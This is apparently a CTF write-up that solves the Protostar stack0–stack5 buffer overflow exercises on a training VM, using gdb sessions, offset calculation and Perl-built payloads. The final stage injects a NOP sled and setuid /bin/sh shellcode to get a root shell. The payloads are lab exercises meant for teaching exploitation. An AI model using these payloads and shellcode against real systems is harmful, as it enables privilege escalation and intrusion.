---
layout: post
title: Protostar - stack challenges
date: '2023-05-09 17:59:45 +0100'
categories : [CTF-WRITEUPS,Protostar - stack]
tags : [pwn,ctf,buffer overflow]
---

Hello friend,

In this series of posts, we are going to be solving the challenges from protostar

## Description

The Protostar Stack exercises are a series of challenges focused on buffer overflow vulnerabilities in Linux-based systems. They require the user to exploit these vulnerabilities in a program to gain access to a shell and execute commands on the system. These challenges are designed to teach and test the user's understanding of memory management and exploitation techniques in a practical and hands-on way.

## Setting up

Before starting to solve these challenges, we need to set up the machine, here is the link of the `iso` file : [exploit-exercises-protostar-2.iso](exploit-exercises-protostar-2.iso).

I'm using VirtualBox as hypervisor, you can use whatever you like :)

You can follow this [article](https://www.intowindows.com/how-to-boot-and-install-from-iso-in-virtualbox/) To boot and install from an iso file.

Once the installation is finished, you should have something similar to this :

<img src="/../assets/protostar_stack0.png" />

```yaml
    username:   user
    password:   user
```

type `ip a` to get the ip address of the machine, so that you can connect to it using `ssh`.

```bash
┌──(yariss㉿Kali-VM)-[~/boxes]
└─$ ssh -oHostKeyAlgorithms=+ssh-dss user@192.168.11.106         
The authenticity of host '192.168.11.106 (192.168.11.106)' can't be established.
DSA key fingerprint is SHA256:je0HADrfaaxXDeyzXHoQUyK1TmjRIhuJ3jlQVcTkgUA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.11.106' (DSA) to the list of known hosts.


    PPPP  RRRR   OOO  TTTTT  OOO   SSSS TTTTT   A   RRRR  
    P   P R   R O   O   T   O   O S       T    A A  R   R 
    PPPP  RRRR  O   O   T   O   O  SSS    T   AAAAA RRRR  
    P     R  R  O   O   T   O   O     S   T   A   A R  R  
    P     R   R  OOO    T    OOO  SSSS    T   A   A R   R 

          http://exploit-exercises.com/protostar                                                 

Welcome to Protostar. To log in, you may use the user / user account.
When you need to use the root account, you can login as root / godmode.

For level descriptions / further help, please see the above url.

user@192.168.11.106's password: 
Linux (none) 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May  9 14:12:20 2023
$ bash
user@protostar:~$ whoami
user
user@protostar:~$ hostname
protostar
user@protostar:~$ 
```

Now we can start !

## Stack 0

### Challenge description

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at `/opt/protostar/bin/stack0`

### Challenge source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

### Challenge solution

Since `gets()` doesn't control the size of the buffer, we can provide a string that has more than 64 chars, this way we can change the `modified` variable.


<img src="/../assets/protostar_stack0_buffer.png" />

All we need to do is to fill the buffer with 64 bytes, then add 1 byte to change the variable.

Let's explore this with GDB

```bash
user@protostar:/opt/protostar/bin$ gdb ./stack0
```

```bash
(gdb) set disassembly-flavor intel
(gdb) disassemble main 
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave  
0x08048434 <main+64>:   ret    
End of assembler dump.
(gdb) 
```

Let's set a break point at the end of main, to examine the `modified` variable.

```bash
(gdb) b *main+63
Breakpoint 1 at 0x8048433: file stack0/stack0.c, line 18.
(gdb) 
```

> Notice that `[esp+0x5c]` is where the value of `modified` is stored.


Let's generate a string of 64 bytes.

```bash
user@protostar:/tmp/yariss$ perl -e 'print "A" x 64 . "\n"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Now if we run the program, adding 4 bytes, the value of `modified` should be those 4 bytes.

```bash
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX
you have changed the 'modified' variable
```

We modified the variable !

Let's examine the value of `modified`

```bash
(gdb) x/x $esp+0x5c
0xbffff79c:     0x58585858
(gdb) x/s $esp+0x5c
0xbffff79c:      "XXXX"
```

As expected, `modified` holds the last 4 bytes that we specified, since it is just below the buffer.

Let's run this outside gdb.

```bash
user@protostar:/opt/protostar/bin$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX
you have changed the 'modified' variable
```

We solved it !

I'll see you in the next challenge !


## Stack 1

### Challenge description

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at `/opt/protostar/bin/stack1`

Hints

+ If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
+ Protostar is little endian


### Challenge source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
### Challenge solution

This is exactly like the first challenge, the only difference is `modified` needs a specific value `0x61626364`.

Using the ascii table , `0x61` is the character `a`, `0x62` is `b`, then `c`, and finally `d`,

> Note : man ascii to check the ascii table.

Let's explore this in gdb

```bash
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd
Try again, you got 0x64636261
(gdb) x/x $esp+0x5c
0xbffff74c:     0x64636261
```

Why isn't working ?

Notice that the bytes are in the reverse order, since protostar follows little endian byte order.

To solve this, all we need to do is to reverse the order of abcd.
> abcd > dcba

```bash
user@protostar:/opt/protostar/bin$ ./stack1 $(perl -e 'print "A" x 64 . "dcba"')
you have correctly got the variable to the right value
```

We solved it :D

## Stack 2

### Challenge description

Stack2 looks at environment variables, and how they can be set.

This level is at `/opt/protostar/bin/stack2`

### Challenge source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### Challenge solution

Ok, this time our payload should be stored in an environement variable.

Its always 64 bytes long + the value in the comparaison.

Let's set our payload.

```bash
user@protostar:/opt/protostar/bin$ export GREENIE=$(perl -e 'print "A" x 64 . "\x0a\x0d\x0a\x0d"')
```

> Note : \x0a\x0d\x0a\x0d is how hexadecimal bytes are represented , notice that they are in reverse order (little endian)

```bash
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

We solved it :D


## Stack 3

### Challenge description

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

+ both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at `/opt/protostar/bin/stack3`

### Challenge source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Challenge solution

This is getting interesting !

We are provided with a `win` function, and we need to jump to it.

Since `win` is just an address in the memory, we can set `fp` to point to `win` if we know its address.

To determine the address of `win`, we can use gdb.


```bash
user@protostar:/opt/protostar/bin$ gdb ./stack3
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
```

We can use `objdump` as well.

```bash
user@protostar:/opt/protostar/bin$ objdump -t ./stack3 | grep win
08048424 g     F .text  00000014              win
```

We got the address : `0x8048424`

Now let's use the same technique as earlier.


```bash
user@protostar:/opt/protostar/bin$ perl -e 'print "A" x 64 . "\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

We solved it :D

## Stack 4

### Challenge description

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at `/opt/protostar/bin/stack4`

Hints

+ A variety of introductory papers into buffer overflows may help.
+ gdb lets you do “run < input”
+ EIP is not directly after the end of buffer, compiler padding can also increase the size.

### Challenge source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
### Challenge solution

In this level, we are provided with a very short source code. It seems like there is no way to call the win function.

To illustrate how the attack is going to work, you need to understand how the stack works.

Let's use the above code as example.

When main is called, here is how the stack would look like :

<img src="/../assets/protostar_stack0_main_stackframe.png" />

Now the critical thing here is the `return address`.

Basically, when main is finished, the `return address` is popped from the stack into the `EIP` or the instruction pointer.

The instruction pointer points to the instruction that the CPU is going to execute.

If we somehow modify the return address, we can redirect the program flow into the `win` function.

All we need to know is how many bytes we need to reach the return address.

We can test this by using `cyclic` and `gdb`.

> cyclic is a pattern generator program that allows us to generate a number of characters following a pattern.

Let's generate 100 characters.

```bash
┌──(yariss㉿Kali-VM)-[~]
└─$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Now let's run gdb and give this as input.

```bash
Starting program: /opt/protostar/bin/stack4 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
```

Yes, when you get segmentation fault, it means that the program tried to jump to a memory location that doesn't exist / you aren't allowed to jump to.

Notice that the program tried to jump to `0x61616174`, which is `aaat`

Since we used `cyclic` to generate the pattern, we can determine how many bytes until the first occurence of that pattern.

```bash
└─$ cyclic -l 0x61616174
76
```

We got the offset ! Now all we need to do is determine the address of `win` and use the same payload as before.

```bash
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
```

It's time to smash the stack !

```bash
user@protostar:/opt/protostar/bin$ perl -e 'print "A" x 76 . "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
```

We solved it :D

## Stack 5

### Challenge description

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at `/opt/protostar/bin/stack5`

Hints

+ At this point in time, it might be easier to use someone elses shellcode
+ If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
+ remove the int3s once your shellcode is done.

### Challenge source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

### Challenge solution

We dont have any function to jump to !
what about jumping to a malicious code that will give us root privileges?

Here is a breakdown of the idea :

- First, we need to determine the offset, just like in the previous challenge.
- Once we have the offset, we need an address to jump to, in thise case the address of our malicious code.

There is a problem here, we cannot predict the address of our shellcode before actually loading it into the memory.

How are we then going to solve this problem?

Let me introduce you to the `NOP SLED`.

A NOP sled (No Operation sled) is a technique used in computer security to increase the likelihood that a malicious code or exploit will execute successfully. It involves padding the front of the malicious code with a series of NOP (No Operation) instructions, which are essentially instructions that do nothing.

Here is what our payload would look like :

<img src="/...assets/protostar_stack0_nopsled.png" />

Basically, we will provide enough NOP instructions to ensure that we land there, executing our shellcode.

A NOP has an opcode of `\x90`.

Now let's create a payload and determine the address that we are going to jump to.


```bash
user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "BBBB" . "\x90" x 100')

user@protostar:/opt/protostar/bin$ echo $payload > /tmp/yariss/payload 
```

```bash
user@protostar:/opt/protostar/bin$ gdb ./stack4
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
(gdb) b *main+21
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) run < /tmp/yariss/payload 

```

Let's now examine the stack.

```bash
(gdb) x/64wx $esp
0xbffff6f0:     0xbffff700      0xb7ec6165      0xbffff708      0xb7eada75
0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffff750:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff760:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff770:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff780:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff790:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7b0:     0x90909090      0xb7ff6200      0xb7eadb9b      0xb7ffeff4
0xbffff7c0:     0x00000001      0x08048340      0x00000000      0x08048361
0xbffff7d0:     0x08048408      0x00000001      0xbffff7f4      0x08048430
0xbffff7e0:     0x08048420      0xb7ff1040      0xbffff7ec      0xb7fff8f8
```

As you can see, `0x90909090` are the NOP instructions we provided, all we need to do is to grab an address that points to one of the NOP, let's take `0xbffff780`.

Now our payload is going to be something like this :

```bash
user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "\x80\xf7\xff\xbf" . "\x90" x 100')
```

But we need some sort of code to execute after the NOP operations, let's test `\xcc` which is basically the opcode for breakpoint.

```bash
user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "\x80\xf7\xff\xbf" . "\x90" x 100 . "\xccc" x 4')
```

```bash
user@protostar:/opt/protostar/bin$ cat /tmp/yariss/payload | ./stack5
Trace/breakpoint trap
```

Its working !

All left here is to actually provide a malicious code.

Since this is a linux x86 executable, and has a SUID set, we need a shellcode that sets our real uid to the effective uid which is the root uid.

Here is the famous [https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html) where you can find shellcodes :)

And this is the shellcode i chose [https://shell-storm.org/shellcode/files/shellcode-399.html](https://shell-storm.org/shellcode/files/shellcode-399.html) which matches what we need.

`"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"`

Let's now add this shellcode to our payload.

```bash
user@protostar:/opt/protostar/bin$ payload=$(perl -e 'print "A" x 76 . "\x80\xf7\xff\xbf" . "\x90" x 100 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
user@protostar:/opt/protostar/bin$ echo $payload > /tmp/yariss/payload 
```

Now let's execute !!

```bash
user@protostar:/opt/protostar/bin$ cat /tmp/yariss/payload | ./stack5
user@protostar:/opt/protostar/bin$ 
```

What ?? Nothing happens ??

Well actually the shell gets closed and we need to keep it open, here is a trick to do that :

```bash
user@protostar:/opt/protostar/bin$ (cat /tmp/yariss/payload ; cat ) | ./stack5
```

The program takes input from the output of our command, and when the program is done, it closes the pip.

But our program executes a shell, so we need that shell to stay open so we can interact with it

the solution is to group both our payload and the `cat` command as input for our stack5 program
this way our exploit will run and execute the shell, then we can use cat to interact with our shell.

```bash
user@protostar:/opt/protostar/bin$ (cat /tmp/yariss/payload ; cat ) | ./stack5
whoami
root
```

Boom , we are root !!
